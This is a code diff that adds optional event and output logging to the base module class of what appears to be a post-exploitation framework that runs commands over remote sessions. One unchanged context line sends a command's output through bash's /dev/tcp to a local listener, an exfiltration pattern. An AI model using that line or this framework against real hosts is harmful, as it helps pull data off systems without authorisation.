@@ -89,6 +89,7 @@ class KoiModule(ABC):
         self,
         session: "Session",
         args: Optional[List[str]] = None,
+        logger=None,
     ) -> None:
         """
         Parameters
@@ -102,6 +103,7 @@ class KoiModule(ABC):
         self.session = session
         self.raw_args = args or []
         self.args = self._parse_args()
+        self._logger = logger
 
         # Convenience shortcuts so module authors don't need extra imports
         self.ui = ui
@@ -216,6 +218,15 @@ class KoiModule(ABC):
         self.exec(f"( {cmd} ) > /dev/tcp/{local_ip}/{port}", timeout=timeout)
         return collect().decode("utf-8", errors="replace").strip()
 
+    def run_module(self) -> None:
+        if self._logger:
+            self._logger.log_event(f"module_start  {self.name}")
+        try:
+            self.run()
+        finally:
+            if self._logger:
+                self._logger.log_event(f"module_end  {self.name}")
+
     @abstractmethod
     def run(self) -> None:
         """
@@ -266,19 +277,29 @@ class KoiModule(ABC):
                 if text.startswith(marker):
                     rc = int(text.split(":")[-1]) if ":" in text else 0
                     output = "\n".join(output_lines)
-                    return CommandResult(
+                    result = CommandResult(
                         command=command,
                         returncode=rc,
                         stdout=output,
                         duration=time.monotonic() - (deadline - timeout),
                     )
+                    if self._logger:
+                        self._logger.log_event(f"exec  {command}")
+                        if output:
+                            self._logger.log_output(output.encode("utf-8", errors="replace"))
+                    return result
                 output_lines.append(text)
 
-        return CommandResult(
+        result = CommandResult(
             command=command, returncode=1,
             stdout="\n".join(output_lines),
             duration=0,
         )
+        if self._logger:
+            self._logger.log_event(f"exec  {command}")
+            if result.stdout:
+                self._logger.log_output(result.stdout.encode("utf-8", errors="replace"))
+        return result
 
     def exec_stream(self, command: str, timeout: float = 30.0):
         """
